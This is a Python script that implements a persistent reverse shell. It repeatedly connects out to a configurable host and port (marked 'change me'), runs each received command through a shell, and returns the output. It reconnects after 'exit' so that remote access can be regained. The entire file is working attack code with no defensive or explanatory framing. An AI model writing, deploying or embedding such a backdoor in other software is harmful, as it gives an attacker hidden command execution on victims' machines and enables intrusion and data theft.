import socket
import subprocess
import os

COUNT = 0
RHOST = "127.0.0.1"  # change me
RPORT = 4444  # change me if you want or need

while True:
    try:
        tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        tcp.connect((RHOST, RPORT))
        data = '\n"""Connected!"""\n\n' + "***You can use the command 'exit' to leave the shell***\n" \
                                          "***If you use it the program won't break and you can gain" \
                                          " access to shell again.***\n\n"
        tcp.send(str.encode(data))
        tcp.send(str.encode("\033[32m" + os.getcwd() + "> \033[0m"))
        COUNT = 0
    except:
        pass
    while COUNT == 0:
        try:
            cmd = tcp.recv(2048).decode("utf-8")

            # In Case of use CD command
            if cmd.split(" ")[0] == 'cd':
                os.chdir(cmd.split(" ")[1].replace("\n", ""))
                tcp.send(str.encode("\033[32m" + os.getcwd() + "> \033[0m"))

            # To exit and still running the program, to connect in the shell again later
            elif cmd == 'exit\n':
                COUNT += 1

            else:
                output = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                          stdin=subprocess.PIPE)

                tcp.send(output.stdout.read())
                tcp.send(str.encode("\033[32m" + os.getcwd() + "> \033[0m"))

        except Exception or OSError or ConnectionRefusedError as e:
            tcp.send(str.encode("\033[31m" + "An error has occured: \033[0m" + format(e) + "\n"))
